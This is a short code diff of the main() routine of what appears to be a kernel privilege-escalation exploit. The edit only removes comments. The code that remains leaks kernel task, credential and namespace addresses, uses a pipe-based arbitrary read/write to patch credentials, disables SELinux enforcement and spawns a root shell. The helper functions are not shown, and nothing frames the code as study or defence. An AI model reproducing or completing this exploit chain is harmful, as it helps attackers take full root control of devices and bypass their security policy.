@@ -14,7 +14,7 @@
 
 int main() {
   int pipefd[2] = {0};
-  struct task_struct *leak_task_struct = NULL; // Initialize to NULL
+  struct task_struct *leak_task_struct = NULL;
   void *leak_pid_address = NULL;
   void *leak_cred_address = NULL;
   void *leak_nsproxy_address = NULL;
@@ -33,12 +33,10 @@ int main() {
 
   verify_arbitrary_read_write(pipefd, leak_task_struct, leak_pid_address);
 
-  // Stage 5: escalate privileges
   patch_cred(pipefd, leak_task_struct, leak_cred_address);
   disable_selinux_enforcing(pipefd, leak_nsproxy_address);
   verify_root();
 
-  // Cleanup
   if (mapped_memory)
     munmap(mapped_memory, 4096);
 
@@ -46,7 +44,6 @@ int main() {
   close(pipefd[0]);
   close(pipefd[1]);
 
-  // Spawn shell
   spawn_root_shell();
 
   return 0;
